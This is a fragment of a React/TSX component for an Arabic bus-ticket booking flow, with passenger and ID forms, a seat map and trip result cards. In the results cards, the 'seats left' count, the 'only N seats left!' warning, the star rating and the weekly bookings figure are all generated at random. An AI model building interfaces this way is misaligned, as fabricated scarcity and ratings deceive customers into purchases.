                    <p className="text-[9px] text-[#8A7E6B]">المسافة</p>
                    <p className="text-xs font-bold text-charcoal">{activeTrip.distance?.split(' • ')[0] || '-'}</p>
                  </div>
                  <div className="bg-[#FAFAF8] rounded-lg p-2">
                    <Bus className="w-3 h-3 text-[#C4A94D] mx-auto mb-0.5" />
                    <p className="text-[9px] text-[#8A7E6B]">الباص</p>
                    <p className="text-xs font-bold text-charcoal">VIP 50</p>
                  </div>
                  <div className="bg-[#FAFAF8] rounded-lg p-2">
                    <Armchair className="w-3 h-3 text-[#C4A94D] mx-auto mb-0.5" />
                    <p className="text-[9px] text-[#8A7E6B]">المقاعد</p>
                    <p className="text-xs font-bold text-charcoal">{selectedSeats.map(s => s.replace('seat-', '')).join(', ') || '-'}</p>
                  </div>
                </div>

                {/* Timeline */}
                <div className="flex items-center gap-2 pb-1 border-b border-[#F0EDE4]">
                  <Route className="w-3.5 h-3.5 text-[#C4A94D]" />
                  <h4 className="font-extrabold text-charcoal text-xs">مخطط سير الرحلة</h4>
                </div>
                <div className="relative pr-3">
                  {(() => {
                    const stops = activeTrip.routeDetails?.stops?.length
                      ? activeTrip.routeDetails.stops
                      : [
                          { city: activeTrip.from, type: 'pickup' as const, duration: activeTrip.departureTime },
                          { city: activeTrip.to, type: 'dropoff' as const, duration: activeTrip.arrivalTime },
                        ];
                    return (
                      <div className="relative">
                        <div className="absolute right-[4px] top-1.5 bottom-1.5 w-0.5 bg-[#E5E0D5]" />
                        <div className="space-y-2">
                          {stops.map((stop, idx) => {
                            const isFirst = idx === 0;
                            const isLast = idx === stops.length - 1;
                            const isRest = stop.city.includes('استراحة');
                            const isBorder = stop.type === 'border';
                            const dotColor = isFirst ? 'bg-green-500' : isLast ? 'bg-red-500' : isRest ? 'bg-[#C4A94D]' : isBorder ? 'bg-orange-500' : 'bg-[#8A7E6B]';
                            const bgColor = isFirst ? 'bg-green-50 border-green-200' : isLast ? 'bg-red-50 border-red-200' : isRest ? 'bg-[#FDF8E8] border-[#C4A94D]/30' : isBorder ? 'bg-orange-50 border-orange-200' : 'bg-[#FAFAF8] border-[#E5E0D5]';
                            const label = isFirst ? 'انطلاق' : isLast ? 'وصول' : isRest ? 'استراحة' : isBorder ? 'منفذ حدودي' : 'محطة';
                            return (
                              <div key={idx} className="flex items-start gap-2 relative">
                                <div className={`w-2.5 h-2.5 rounded-full ${dotColor} border-2 border-white shadow-sm shrink-0 z-10 mt-1`} />
                                <div className={`flex-1 rounded-lg border p-2 ${bgColor}`}>
                                  <div className="flex items-center justify-between">
                                    <span className="text-xs font-bold text-charcoal">{stop.city}</span>
                                    <span className={`text-[9px] px-1.5 py-0.5 rounded-full text-white ${isFirst ? 'bg-green-500' : isLast ? 'bg-red-500' : isRest ? 'bg-[#C4A94D]' : isBorder ? 'bg-orange-500' : 'bg-[#8A7E6B]'}`}>{label}</span>
                                  </div>
                                  <div className="flex items-center gap-1 mt-0.5 text-[10px] text-[#8A7E6B]">
                                    <Clock className="w-2.5 h-2.5" />
                                    <span dir="ltr">{stop.duration}</span>
                                  </div>
                                </div>
                              </div>
                            );
                          })}
                        </div>
                      </div>
                    );
                  })()}
                </div>

                {/* Price Summary */}
                <div className="bg-gradient-to-b from-[#FDF8E8] to-white border border-[#C4A94D]/30 rounded-xl p-3 space-y-1.5">
                  <h4 className="font-extrabold text-charcoal text-xs flex items-center gap-1">
                    <Receipt className="w-3.5 h-3.5 text-[#C4A94D]" />
                    ملخص الحجز
                  </h4>
                  <div className="flex justify-between text-xs">
                    <span className="text-[#8A7E6B]">{currentFare?.name || 'الأساسية'} × {bookingData.passengers} مسافر</span>
                    <span className="text-charcoal font-bold">{subtotal.toFixed(2)} ر.س</span>
                  </div>
                  <div className="flex justify-between text-xs">
                    <span className="text-[#8A7E6B]">ضريبة القيمة المضافة (15%)</span>
                    <span className="text-charcoal font-bold">{vat.toFixed(2)} ر.س</span>
                  </div>
                  {bookingData.tripType === 'round-trip' && (
                    <div className="flex justify-between text-xs text-green-600">
                      <span>خصم ذهاب وعودة (15%)</span>
                      <span className="font-bold">-{(total * 0.15).toFixed(2)} ر.س</span>
                    </div>
                  )}
                  <div className="border-t border-[#C4A94D]/20 pt-1.5 flex justify-between font-extrabold text-sm">
                    <span className="text-charcoal">الإجمالي</span>
                    <span className="text-[#C4A94D]">{finalTotal} ر.س</span>
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* Passenger Forms */}
          {mergedPassengers.map((p, idx) => (
            <div key={p.id} className="bg-white rounded-3xl shadow-lg border border-[#E5E0D5] p-5 space-y-3">
              <div className="flex items-center gap-3 pb-3 border-b border-[#E5E0D5]">
                <div className={`w-10 h-10 rounded-full ${p.category === 'adult' ? 'bg-brand-gold/10' : p.category === 'child' ? 'bg-blue-50' : 'bg-pink-50'} flex items-center justify-center`}>
                  <User className={`w-5 h-5 ${p.category === 'adult' ? 'text-brand-gold' : p.category === 'child' ? 'text-blue-500' : 'text-pink-500'}`} />
                </div>
                <div className="flex-1">
                  <div className="flex items-center gap-2">
                    <h3 className="font-extrabold text-charcoal">مسافر {idx + 1}</h3>
                    <span className={`text-[10px] px-2 py-0.5 rounded-full font-bold ${p.category === 'adult' ? 'bg-brand-gold/10 text-brand-gold' : p.category === 'child' ? 'bg-blue-50 text-blue-500' : 'bg-pink-50 text-pink-500'}`}>
                      {p.category === 'adult' ? 'بالغ (12+)' : p.category === 'child' ? 'طفل (2-11)' : 'رضيع (0-2)'}
                    </span>
                  </div>
                  <p className="text-xs text-[#8A7E6B]">أدخل البيانات المطلوبة</p>
                </div>
              </div>
              {/* الاسم الثلاثي */}
              <div>
                <label className="block text-xs font-bold text-charcoal mb-1.5">الاسم الثلاثي *</label>
                <input type="text" value={p.fullName} onChange={e => updatePassenger(idx, 'fullName', e.target.value)}
                  placeholder="محمد أحمد العبدالله" className="w-full h-[48px] px-4 border border-[#E5E0D5] rounded-xl text-right focus:outline-none focus:border-brand-gold focus:ring-2 focus:ring-brand-gold/10 text-charcoal text-sm bg-[#FCFBF9] transition-all" />
              </div>
              {/* نوع الوثيقة + رقم الوثيقة */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                <div>
                  <label className="block text-xs font-bold text-charcoal mb-1.5">نوع الوثيقة *</label>
                  <select value={p.documentType} onChange={e => updatePassenger(idx, 'documentType', e.target.value)}
                    className="w-full h-[48px] px-4 border border-[#E5E0D5] rounded-xl text-right focus:outline-none focus:border-brand-gold focus:ring-2 focus:ring-brand-gold/10 text-charcoal text-sm bg-[#FCFBF9] transition-all">
                    <option value="national_id">هوية وطنية</option>
                    <option value="iqama">إقامة</option>
                    <option value="passport">جواز سفر</option>
                  </select>
                </div>
                <div>
                  <label className="block text-xs font-bold text-charcoal mb-1.5">رقم الوثيقة *</label>
                  <input type="text" value={p.idNumber} onChange={e => updatePassenger(idx, 'idNumber', e.target.value)}
                    placeholder={p.documentType === 'national_id' ? '1XXXXXXXXXX' : p.documentType === 'iqama' ? '2XXXXXXXXXX' : 'A12345678'}
                    className="w-full h-[48px] px-4 border border-[#E5E0D5] rounded-xl text-right focus:outline-none focus:border-brand-gold focus:ring-2 focus:ring-brand-gold/10 text-charcoal text-sm bg-[#FCFBF9] font-mono transition-all" />
                </div>
              </div>
              {/* رقم الهاتف + الجنسية */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                <div>
                  <label className="block text-xs font-bold text-charcoal mb-1.5">رقم الهاتف *</label>
                  <input type="tel" value={p.phone} onChange={e => updatePassenger(idx, 'phone', e.target.value)}
                    placeholder="05XXXXXXXX" className="w-full h-[48px] px-4 border border-[#E5E0D5] rounded-xl text-right focus:outline-none focus:border-brand-gold focus:ring-2 focus:ring-brand-gold/10 text-charcoal text-sm bg-[#FCFBF9] font-mono transition-all" />
                </div>
                <div>
                  <label className="block text-xs font-bold text-charcoal mb-1.5">الجنسية</label>
                  <select value={p.nationality} onChange={e => updatePassenger(idx, 'nationality', e.target.value)}
                    className="w-full h-[48px] px-4 border border-[#E5E0D5] rounded-xl text-right focus:outline-none focus:border-brand-gold focus:ring-2 focus:ring-brand-gold/10 text-charcoal text-sm bg-[#FCFBF9] transition-all">
                    {['سعودي', 'إماراتي', 'كويتي', 'بحريني', 'قطري', 'عماني', 'مصري', 'أردني', 'أخرى'].map(n => <option key={n} value={n}>{n}</option>)}
                  </select>
                </div>
              </div>
            </div>
          ))}

          {/* Booker Manager */}
          <div className="bg-white rounded-3xl shadow-lg border border-[#E5E0D5] p-5 space-y-3">
            <div className="flex items-center gap-3 pb-3 border-b border-[#E5E0D5]">
              <div className="w-10 h-10 rounded-full bg-purple-100 flex items-center justify-center">
                <svg className="w-5 h-5 text-purple-600" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                  <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2" />
                  <circle cx="12" cy="7" r="4" />
                </svg>
              </div>
              <div>
                <h3 className="font-extrabold text-charcoal">بيانات مسؤول الحجز</h3>
                <p className="text-xs text-[#8A7E6B]">سيتم إرسال تفاصيل الحجز إلى هذا الرقم *</p>
              </div>
            </div>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
              <div>
                <label className="block text-xs font-bold text-charcoal mb-1.5">الاسم الكامل *</label>
                <input type="text" value={bookerInfo.name} onChange={e => setBookerInfo({ ...bookerInfo, name: e.target.value })}
                  placeholder="محمد العبدالله" className="w-full h-[48px] px-4 border border-[#E5E0D5] rounded-xl text-right focus:outline-none focus:border-brand-gold focus:ring-2 focus:ring-brand-gold/10 text-charcoal text-sm bg-[#FCFBF9] transition-all" />
              </div>
              <div>
                <label className="block text-xs font-bold text-charcoal mb-1.5">رقم الجوال *</label>
                <input type="tel" value={bookerInfo.phone} onChange={e => setBookerInfo({ ...bookerInfo, phone: e.target.value })}
                  placeholder="05XXXXXXXX" className="w-full h-[48px] px-4 border border-[#E5E0D5] rounded-xl text-right focus:outline-none focus:border-brand-gold focus:ring-2 focus:ring-brand-gold/10 text-charcoal text-sm bg-[#FCFBF9] font-mono transition-all" />
              </div>
            </div>
            <div>
              <label className="block text-xs font-bold text-charcoal mb-1.5">
                <span className="text-brand-gold">(</span> اختياري <span className="text-brand-gold">)</span> البريد الإلكتروني
              </label>
              <input type="email" value={bookerInfo.email} onChange={e => setBookerInfo({ ...bookerInfo, email: e.target.value })}
                placeholder="email@example.com" className="w-full h-[48px] px-4 border border-[#E5E0D5] rounded-xl text-right focus:outline-none focus:border-brand-gold focus:ring-2 focus:ring-brand-gold/10 text-charcoal text-sm bg-[#FCFBF9] transition-all" />
            </div>
          </div>

          {/* Footer */}
          <div className="sticky bottom-0 left-0 right-0 bg-white/80 backdrop-blur-md border-t border-[#E5E0D5] py-3 px-4 -mx-4 mt-2">
            <button onClick={handlePassengerNext} disabled={!allPassengersValid || !bookerValid || isLoading}
              className={`w-full h-14 text-white font-bold rounded-2xl shadow-lg transition-all text-lg ${allPassengersValid && bookerValid && !isLoading ? 'gold-gradient hover:shadow-xl hover:scale-[1.02]' : 'bg-[#D5CFC5] cursor-not-allowed'}`}>
              متابعة إلى الدفع
            </button>
          </div>
        </div>
      </div>
    );
  }

  // ═══════════════════════════════════════════════════════════════
  //  STEP 2: SEAT SELECTION (Bus Layout)
  // ═══════════════════════════════════════════════════════════════
  if (step === 'seat_selection') {
    return (
      <div className="fixed inset-0 z-[70] bg-white overflow-y-auto">
        <LoadingScreen isVisible={isLoading} message={loadingMsg} />

        {/* ─── Header ─────────────────────────────────────────── */}
        <div className="sticky top-0 z-10 bg-white border-b border-[#E5E0D5] shadow-sm">
          <div className="max-w-lg mx-auto px-4 py-3 flex items-center justify-between">
            <button onClick={() => !isLoading && setStep('results')} className="w-10 h-10 rounded-full bg-[#F8F6F2] flex items-center justify-center text-[#8A7E6B] hover:text-charcoal transition-colors">
              <ChevronLeft className="w-5 h-5" />
            </button>
            <div className="flex items-center gap-3">
              <h2 className="text-base font-extrabold text-charcoal">اختيار المقاعد</h2>
              <span className="text-xs bg-gradient-to-r from-[#C4A94D] to-[#B8983E] text-white px-2.5 py-0.5 rounded-full font-bold">2/5</span>
            </div>
            <img src="/sat-logo.png" alt="سات" className="h-8 w-auto" />
          </div>
        </div>

        <div className="max-w-lg mx-auto px-4 py-5">
          {/* ═══ 5-Step Progress Bar ═══ */}
          <div className="bg-white rounded-2xl shadow-sm border border-[#E5E0D5] p-4 mb-6">
            <div className="flex items-center justify-between relative">
              <div className="absolute top-[18px] left-[10%] right-[10%] h-[2px] bg-[#E5E0D5] -z-0">
                <div className="h-full bg-gradient-to-l from-[#C4A94D] to-[#C4A94D] transition-all duration-700" style={{ width: '25%' }} />
              </div>
              {[
                { label: 'البحث', num: 1, done: true, active: false },
                { label: 'المقاعد', num: 2, done: false, active: true },
                { label: 'التفاصيل', num: 3, done: false, active: false },
                { label: 'الدفع', num: 4, done: false, active: false },
                { label: 'التأكيد', num: 5, done: false, active: false },
              ].map((s, i) => (
                <div key={i} className="flex flex-col items-center gap-1.5 relative z-10">
                  <div className={`w-9 h-9 rounded-full flex items-center justify-center text-xs font-extrabold transition-all duration-500 shadow-sm ${
                    s.active ? 'bg-gradient-to-r from-[#C4A94D] to-[#B8983E] text-white shadow-lg scale-110 ring-4 ring-[#C4A94D]/20' :
                    s.done ? 'bg-[#C4A94D] text-white' : 'bg-white text-[#B5AFA3] border-2 border-[#E5E0D5]'
                  }`}>
                    {s.done && !s.active ? <Check className="w-4 h-4" /> : s.num}
                  </div>
                  <span className={`text-[10px] font-bold transition-colors ${s.active ? 'text-[#C4A94D]' : s.done ? 'text-[#8A7E6B]' : 'text-[#B5AFA3]'}`}>{s.label}</span>
                </div>
              ))}
            </div>
          </div>

          {/* ─── Title + Counter ──────────────────────────────── */}
          <div className="flex items-center justify-between mb-4 px-1">
            <div className="text-left">
              <p className={`text-sm font-bold ${selectedSeats.length === totalPassengers ? 'text-green-500' : 'text-orange-500'}`}>
                {selectedSeats.length}/{totalPassengers} المقاعد المحددة
              </p>
              {selectedSeats.length > 0 && selectedSeats.length < totalPassengers && (
                <p className="text-[10px] text-orange-400 mt-0.5">اختر {totalPassengers - selectedSeats.length} مقاعد أخرى</p>
              )}
            </div>
            <h3 className="text-xl font-extrabold text-charcoal">اختر مقاعدك</h3>
          </div>

          {/* ─── Legend ───────────────────────────────────────── */}
          <div className="flex items-center justify-center gap-5 mb-5 text-xs">
            {[
              { color: 'bg-white border-gray-300', label: 'متاح' },
              { color: 'bg-[#22c55e] border-[#22c55e]', label: 'محدد' },
              { color: 'bg-[#eab308] border-[#eab308]', label: 'محجوز' },
              { color: 'bg-[#ef4444] border-[#ef4444]', label: 'غير متوفر' },
            ].map(item => (
              <div key={item.label} className="flex items-center gap-1.5">
                <div className={`w-5 h-4 rounded-t-lg border ${item.color}`} />
                <span className="text-[#8A7E6B]">{item.label}</span>
              </div>
            ))}
          </div>

          {/* ─── Bus Seat Layout ──────────────────────────────── */}
          <div className="flex justify-center mb-6">
            <div className="bg-gradient-to-b from-[#F5F3EF] to-[#EBE7DF] rounded-3xl p-4 md:p-6 shadow-inner w-full max-w-[320px]">
              {/* Driver */}
              <div className="text-center mb-3">
                <svg className="w-8 h-8 mx-auto text-charcoal/40" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5">
                  <circle cx="12" cy="7" r="3" />
                  <path d="M12 10v2M9 17l3-5 3 5M8 22h8" />
                  <path d="M6 12h12v4H6z" opacity="0.3" />
                </svg>
              </div>

              {/* Seat rows */}
              <div className="space-y-1.5">
                {seatLayout.map((row, rowIdx) => {
                  // Back row (5 seats)
                  if ('back' in row && row.back) {
                    return (
                      <div key={`back-${rowIdx}`} className="flex justify-center gap-1.5 pt-2">
                        {row.back.map(num => {
                          const seat = busSeats.find(s => s.num === num);
                          const isSelected = selectedSeats.includes(`seat-${num}`);
                          const isOccupied = seat?.status === 'occupied';
                          return (
                            <button
                              key={num}
                              onClick={() => !isOccupied && toggleSeat(`seat-${num}`)}
                              disabled={isOccupied}
                              className={`w-10 h-10 md:w-11 md:h-11 rounded-t-xl font-bold text-xs flex items-center justify-center transition-all border-2 ${
                                isSelected
                                  ? 'bg-[#22c55e] text-white border-[#22c55e] shadow-lg scale-105'
                                  : isOccupied
                                    ? 'bg-[#eab308] text-white border-[#eab308] cursor-not-allowed'
                                    : 'bg-white text-charcoal border-gray-300 hover:border-[#22c55e] hover:shadow-md'
                              }`}
                            >
                              {num.toString().padStart(2, '0')}
                            </button>
                          );
                        })}
                      </div>
                    );
                  }

                  // Normal rows
                  return (
                    <div key={rowIdx} className="flex items-center justify-between gap-2">
                      {/* Left side (2 seats) */}
                      <div className="flex gap-1.5">
                        {row.left?.map(num => {
                          const seat = busSeats.find(s => s.num === num);
                          const isSelected = selectedSeats.includes(`seat-${num}`);
                          const isOccupied = seat?.status === 'occupied';
                          return (
                            <button
                              key={num}
                              onClick={() => !isOccupied && toggleSeat(`seat-${num}`)}
                              disabled={isOccupied}
                              className={`w-10 h-10 md:w-11 md:h-11 rounded-t-xl font-bold text-xs flex items-center justify-center transition-all border-2 ${
                                isSelected
                                  ? 'bg-[#22c55e] text-white border-[#22c55e] shadow-lg scale-105'
                                  : isOccupied
                                    ? 'bg-[#ef4444] text-white border-[#ef4444] cursor-not-allowed'
                                    : 'bg-white text-charcoal border-gray-300 hover:border-[#22c55e] hover:shadow-md'
                              }`}
                            >
                              {num.toString().padStart(2, '0')}
                            </button>
                          );
                        })}
                      </div>

                      {/* Aisle gap */}
                      <div className="flex-1" />

                      {/* Right side (2 seats) */}
                      <div className="flex gap-1.5">
                        {row.right?.map(num => {
                          const seat = busSeats.find(s => s.num === num);
                          const isSelected = selectedSeats.includes(`seat-${num}`);
                          const isOccupied = seat?.status === 'occupied';
                          return (
                            <button
                              key={num}
                              onClick={() => !isOccupied && toggleSeat(`seat-${num}`)}
                              disabled={isOccupied}
                              className={`w-10 h-10 md:w-11 md:h-11 rounded-t-xl font-bold text-xs flex items-center justify-center transition-all border-2 ${
                                isSelected
                                  ? 'bg-[#22c55e] text-white border-[#22c55e] shadow-lg scale-105'
                                  : isOccupied
                                    ? 'bg-[#ef4444] text-white border-[#ef4444] cursor-not-allowed'
                                    : 'bg-white text-charcoal border-gray-300 hover:border-[#22c55e] hover:shadow-md'
                              }`}
                            >
                              {num.toString().padStart(2, '0')}
                            </button>
                          );
                        })}
                      </div>
                    </div>
                  );
                })}
              </div>
            </div>
          </div>

          {/* ─── Selected Seats Summary ───────────────────────── */}
          {selectedSeats.length > 0 && (
            <div className="bg-green-50 border border-green-200 rounded-2xl p-4 mb-4">
              <p className="text-sm font-bold text-charcoal mb-2">المقاعد المختارة:</p>
              <div className="flex flex-wrap gap-2">
                {selectedSeats.map(s => (
                  <span key={s} className="inline-flex items-center gap-1.5 bg-[#22c55e] text-white text-sm px-4 py-1.5 rounded-full font-bold">
                    مقعد {s.replace('seat-', '')}
                    <button onClick={() => toggleSeat(s)} className="hover:text-white/80">
                      <X className="w-3.5 h-3.5" />
                    </button>
                  </span>
                ))}
              </div>
            </div>
          )}

          {/* ─── Footer ───────────────────────────────────────── */}
          <div className="sticky bottom-0 left-0 right-0 bg-white/80 backdrop-blur-md border-t border-[#E5E0D5] py-3 px-4 -mx-4 mt-2">
            <button
              onClick={handleSeatNext}
              disabled={selectedSeats.length !== totalPassengers || isLoading}
              className={`w-full h-14 text-white font-bold rounded-2xl shadow-lg transition-all text-lg flex items-center justify-center gap-2 ${
                selectedSeats.length === totalPassengers && !isLoading
                  ? 'gold-gradient hover:shadow-xl hover:scale-[1.02]'
                  : 'bg-[#D5CFC5] cursor-not-allowed'
              }`}
            >
              <Check className="w-5 h-5" />
              {selectedSeats.length === 0 ? `اختر ${totalPassengers} مقاعد`
                : selectedSeats.length < totalPassengers ? `اختر ${totalPassengers - selectedSeats.length} مقاعد أخرى`
                : 'تأكيد المقاعد'}
            </button>
          </div>
        </div>
      </div>
    );
  }

  // ═══════════════════════════════════════════════════════════════
  //  STEP 1: RESULTS
  // ═══════════════════════════════════════════════════════════════
  if (!resultsLoaded) {
    return (
      <div className="fixed inset-0 z-[70] bg-gradient-to-b from-[#F0EDE4] to-white flex items-center justify-center">
        <LoadingScreen isVisible={true} message={loadingMessages[0]} />
      </div>
    );
  }

  return (
    <div className="fixed inset-0 z-[70] bg-[#F5F3EF] overflow-y-auto">
      <LoadingScreen isVisible={isLoading} message={loadingMsg} />

      {/* Header */}
      <div className="sticky top-0 z-10 bg-white border-b border-[#E5E0D5] shadow-sm">
        <div className="max-w-3xl mx-auto px-4 py-3 flex items-center justify-between">
          <button onClick={onClose} className="w-10 h-10 rounded-full bg-[#F8F6F2] flex items-center justify-center text-[#8A7E6B] hover:text-charcoal transition-colors">
            <X className="w-5 h-5" />
          </button>
          <div className="flex items-center gap-3">
            <h2 className="text-base font-extrabold text-charcoal">رحلات المغادرة</h2>
            <span className="text-xs bg-gradient-to-r from-[#C4A94D] to-[#B8983E] text-white px-2.5 py-0.5 rounded-full font-bold">1/5</span>
          </div>
          <img src="/sat-logo.png" alt="سات" className="h-8 w-auto" />
        </div>
        <div className="bg-[#F8F6F2] border-t border-[#E5E0D5]">
          <div className="max-w-3xl mx-auto px-4 py-2.5 flex flex-wrap items-center gap-3 text-xs text-[#8A7E6B]">
            <span className="flex items-center gap-1"><MapPin className="w-3.5 h-3.5 text-brand-gold" />{bookingData.from}</span>
            <ChevronLeft className="w-3 h-3 rotate-180" />
            <span className="flex items-center gap-1"><MapPin className="w-3.5 h-3.5 text-brand-gold" />{bookingData.to}</span>
            <span className="text-[#E5E0D5] hidden md:inline">|</span>
            <span className="flex items-center gap-1"><Calendar className="w-3.5 h-3.5 text-brand-gold" />{formatDate(bookingData.pickupDate)}</span>
            <span className="text-[#E5E0D5] hidden md:inline">|</span>
            <span className="flex items-center gap-1"><Users className="w-3.5 h-3.5 text-brand-gold" />{bookingData.passengers} مسافر</span>
          </div>
        </div>
      </div>

      <div className="max-w-3xl mx-auto px-4 py-5">
        {/* ═══ 5-Step Progress Bar ═══ */}
        <div className="bg-white rounded-2xl shadow-sm border border-[#E5E0D5] p-4 mb-5">
          <div className="flex items-center justify-between relative">
            <div className="absolute top-[18px] left-[10%] right-[10%] h-[2px] bg-[#E5E0D5] -z-0">
              <div className="h-full bg-gradient-to-l from-[#C4A94D] to-[#C4A94D] transition-all duration-700" style={{ width: '0%' }} />
            </div>
            {[
              { label: 'البحث', num: 1, done: false, active: true },
              { label: 'المقاعد', num: 2, done: false, active: false },
              { label: 'التفاصيل', num: 3, done: false, active: false },
              { label: 'الدفع', num: 4, done: false, active: false },
              { label: 'التأكيد', num: 5, done: false, active: false },
            ].map((s, i) => (
              <div key={i} className="flex flex-col items-center gap-1.5 relative z-10">
                <div className={`w-9 h-9 rounded-full flex items-center justify-center text-xs font-extrabold transition-all duration-500 shadow-sm ${
                  s.active ? 'bg-gradient-to-r from-[#C4A94D] to-[#B8983E] text-white shadow-lg scale-110 ring-4 ring-[#C4A94D]/20' :
                  s.done ? 'bg-[#C4A94D] text-white' : 'bg-white text-[#B5AFA3] border-2 border-[#E5E0D5]'
                }`}>
                  {s.done && !s.active ? <Check className="w-4 h-4" /> : s.num}
                </div>
                <span className={`text-[10px] font-bold transition-colors ${s.active ? 'text-[#C4A94D]' : s.done ? 'text-[#8A7E6B]' : 'text-[#B5AFA3]'}`}>{s.label}</span>
              </div>
            ))}
          </div>
        </div>

        {bookingData.tripType === 'round-trip' && (
          <div className="bg-gradient-to-r from-green-50 to-green-100 border border-green-200 rounded-2xl p-4 mb-4 flex items-center gap-3">
            <div className="w-10 h-10 rounded-full bg-green-500 flex items-center justify-center shrink-0 shadow-md"><Check className="w-5 h-5 text-white" /></div>
            <div><p className="text-green-800 font-bold text-sm">تم تطبيق خصم 15% على ذهاب وعودة</p><p className="text-green-600 text-xs">وفّر المزيد عند حجز رحلة ذهاب وعودة</p></div>
          </div>
        )}

        <div className="space-y-5">
          {trips.map(trip => {
            const isExpanded = expandedTrip === trip.id;
            const isSelected = selectedTripId === trip.id;
            const { subtotal: st, total: tl } = calcTotal(trip.basePrice);
            const tripTotal = bookingData.tripType === 'round-trip' ? Math.floor(tl * 0.85) : tl;
            const seatsLeft = Math.floor(Math.random() * 12) + 3; // Random 3-15 seats
            const occupancyPercent = Math.floor(((45 - seatsLeft) / 45) * 100);
            const rating = (4.5 + Math.random() * 0.5).toFixed(1);
            const bookingsLastWeek = Math.floor(Math.random() * 200) + 100;

            // Bus amenities based on fare class
            const amenities = trip.fareClass === 'VIP' ? [
              { icon: Wifi, label: 'واي فاي' },
              { icon: Plug, label: 'USB' },
              { icon: Zap, label: 'شاحن' },
              { icon: Snowflake, label: 'تكييف' },
              { icon: Bath, label: 'دورة مياه' },
              { icon: Navigation, label: 'GPS' },
            ] : [
              { icon: Wifi, label: 'واي فاي' },
              { icon: Snowflake, label: 'تكييف' },
              { icon: Navigation, label: 'GPS' },
            ];

            return (
              <div
                key={trip.id}
                className={`rounded-3xl border-2 overflow-hidden transition-all duration-300 ${
                  isSelected
                    ? 'border-brand-gold bg-gradient-to-b from-[#FDF8E8] to-[#F5ECD0] shadow-xl shadow-brand-gold/10'
                    : 'border-[#E5E0D5] bg-white shadow-sm hover:shadow-lg hover:border-[#D5CFC5]'
                }`}
              >
                {/* ─── Selected Checkmark ─── */}
                {isSelected && (
                  <div className="bg-gradient-to-r from-brand-gold to-[#D4A03A] text-white px-5 py-2 flex items-center justify-between">
                    <div className="flex items-center gap-2">
                      <Check className="w-5 h-5" />
                      <span className="text-sm font-bold">تم اختيار هذه الرحلة</span>
                    </div>
                    <Star className="w-5 h-5 text-white fill-white" />
                  </div>
                )}

                {/* ─── Card Body (Accordion Trigger) ─── */}
                <div
                  className="p-5 cursor-pointer"
                  onClick={() => setExpandedTrip(isExpanded ? null : trip.id)}
                >
                  {/* Top Row: Badges */}
                  <div className="flex items-center justify-between mb-4 flex-wrap gap-2">
                    <div className="flex items-center gap-2 flex-wrap">
                      {/* Fare Class Badge */}
                      <span className={`inline-flex items-center gap-1 text-[11px] px-3 py-1.5 rounded-full font-bold ${
                        trip.fareClass === 'VIP'
                          ? 'bg-purple-100 text-purple-700 border border-purple-200'
                          : trip.fareClass === 'عملية'
                          ? 'bg-blue-100 text-blue-700 border border-blue-200'
                          : 'bg-green-100 text-green-700 border border-green-200'
                      }`}>
                        {trip.fareClass === 'VIP' && <Crown className="w-3 h-3" />}
                        {trip.fareClass === 'عملية' && <Briefcase className="w-3 h-3" />}
                        {trip.fareClass === 'اقتصادي' && <Wallet className="w-3 h-3" />}
                        {trip.fareClass}
                      </span>
                      {/* Direct Badge */}
                      <span className="inline-flex items-center gap-1 bg-green-50 text-green-600 text-[11px] px-3 py-1.5 rounded-full font-bold border border-green-100">
                        <Check className="w-3 h-3" />
                        مباشر
                      </span>
                      {/* Trip Number */}
                      <span className="text-[10px] text-[#B5AFA3] font-mono bg-[#F5F3EF] px-2 py-1 rounded">{trip.tripNumber}</span>
                    </div>
                    {/* Seats Left */}
                    <div className={`flex items-center gap-1.5 text-[11px] font-bold px-3 py-1.5 rounded-full ${
                      seatsLeft <= 6
                        ? 'bg-red-50 text-red-600 border border-red-100'
                        : 'bg-orange-50 text-orange-600 border border-orange-100'
                    }`}>
                      <Users className="w-3 h-3" />
                      {seatsLeft <= 6 ? `تبقى ${seatsLeft} مقاعد فقط!` : `${seatsLeft} مقاعد متاحة`}
                    </div>
                  </div>

                  {/* ─── Timeline ─── */}
                  <div className="flex items-center gap-4 mb-4">
                    {/* Departure */}
                    <div className="text-center flex-1 min-w-0">
                      <div className="text-3xl font-extrabold text-charcoal leading-tight">{trip.departureTime}</div>
                      <div className="text-sm font-bold text-[#8A7E6B] mt-1 truncate">{trip.from}</div>
                      <div className="text-[10px] text-[#B5AFA3] mt-0.5">{formatDate(trip.date)}</div>
                    </div>

                    {/* Timeline Track */}
                    <div className="flex-[1.5] flex flex-col items-center min-w-[140px]">
                      <div className="text-xs font-bold text-[#8A7E6B] mb-2">{trip.duration}</div>
                      <div className="w-full flex items-center gap-0 relative px-1">
                        {/* Start dot */}
                        <div className="w-3 h-3 rounded-full bg-brand-gold border-2 border-white shadow-md shrink-0 z-10" />
                        {/* Track line */}
                        <div className="flex-1 h-1 bg-gradient-to-r from-[#E5E0D5] via-brand-gold/30 to-[#E5E0D5] rounded-full relative mx-1">
                          {/* Animated bus icon */}
                          <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2">
                            <div className="w-8 h-8 bg-white rounded-full shadow-md border-2 border-brand-gold flex items-center justify-center animate-pulse">
                              <Bus className="w-4 h-4 text-brand-gold" />
                            </div>
                          </div>
                        </div>
                        {/* End dot */}
                        <div className="w-3 h-3 rounded-full bg-brand-gold border-2 border-white shadow-md shrink-0 z-10" />
                      </div>
                      <div className="text-[10px] text-[#B5AFA3] mt-2 font-medium">{trip.distance}</div>
                    </div>

                    {/* Arrival */}
                    <div className="text-center flex-1 min-w-0">
                      <div className="text-3xl font-extrabold text-charcoal leading-tight">{trip.arrivalTime}</div>
                      <div className="text-sm font-bold text-[#8A7E6B] mt-1 truncate">{trip.to}</div>
                    </div>
                  </div>

                  {/* ─── Amenities + Rating + Occupancy ─── */}
                  <div className="flex items-center justify-between flex-wrap gap-3 pt-3 border-t border-[#F0EDE4]">
                    {/* Amenities */}
                    <div className="flex items-center gap-1.5">
                      {amenities.map((a, i) => (
                        <div key={i} className="w-8 h-8 rounded-lg bg-[#F5F3EF] flex items-center justify-center" title={a.label}>
                          <a.icon className="w-4 h-4 text-[#8A7E6B]" />
